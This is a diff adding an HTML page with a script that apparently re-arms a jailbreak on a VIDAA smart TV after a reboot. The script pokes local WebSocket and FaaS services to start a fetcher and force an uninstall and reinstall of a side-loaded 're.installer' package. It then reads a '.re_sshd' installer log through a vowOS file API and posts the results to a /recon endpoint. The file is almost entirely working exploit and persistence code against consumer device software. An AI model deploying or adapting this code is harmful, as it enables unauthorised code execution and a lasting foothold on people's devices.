@@ -1,0 +1,61 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>vidaa re-arm</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">REARM</pre>
+<script>
+/* Re-arm the already-installed re.installer package after a reboot.
+   Nothing is downloaded: /APPS/installer.ipk and the sw2.js FaaS helper
+   survive on /APPS. Sends superwatch uninstall (83) then install (82). */
+var O = document.getElementById('o');
+function log(m){ O.textContent += "\n" + m; return m; }
+function post(t){ try{ var x=new XMLHttpRequest(); x.open('POST','/recon',false);
+  x.setRequestHeader('Content-Type','text/plain'); x.send(t); }catch(e){} }
+function sleep(ms){ return new Promise(function(r){ setTimeout(r,ms); }); }
+
+function startFetcher(){
+  return new Promise(function(resolve){
+    try{
+      var ws = new WebSocket('wss://localhost:9888');
+      ws.onopen = function(){
+        ws.send(JSON.stringify({path:'phoenix://service/basic/fetcher', method:'start',
+                                parameters:{}, session:901, timeout:10}));
+        setTimeout(function(){ try{ ws.close(); }catch(e){} resolve('fetcher start sent'); }, 1200);
+      };
+      ws.onerror = function(){ resolve('fetcher start: ws error'); };
+      setTimeout(function(){ resolve('fetcher start: timeout'); }, 5000);
+    }catch(e){ resolve('fetcher start EXC ' + e.message); }
+  });
+}
+
+function trigger(){
+  var urls = ['https://localhost:9888/function/basic/fetch/sw2',
+              'http://localhost:9009/function/basic/fetch/sw2'];
+  var out = [];
+  for (var i=0;i<urls.length;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('POST', urls[i], false);
+      x.setRequestHeader('Content-Type','application/json');
+      x.setRequestHeader('identifier','');
+      x.send(JSON.stringify({list:['90:83:90;re.installer',
+                                   '91:82:91;/APPS/installer.ipk;re.installer;']}));
+      out.push(urls[i] + ' -> ' + String(x.responseText||'').slice(0,300));
+      if (String(x.responseText||'').length) break;
+    }catch(e){ out.push(urls[i] + ' EXC ' + e.name + ': ' + e.message); }
+  }
+  return out.join(' | ');
+}
+
+setTimeout(async function(){
+  var out = [];
+  out.push(await startFetcher());
+  await sleep(1200);
+  out.push('trigger -> ' + trigger());
+  await sleep(3500);
+  try{
+    var p = vowOS.service.syncExecute('hiutils', {api:'fileRead',
+             args:{mode:6, path:'.re_sshd/installer_log.txt'}});
+    out.push('log=' + (p.ret ? String(p.msg).slice(0,1200) : 'ERR'));
+  }catch(e){ out.push('log EXC ' + e.message); }
+  log(out.join('\n'));
+  post('REARM\n' + out.join('\n'));
+}, 1000);
+</script></body></html>
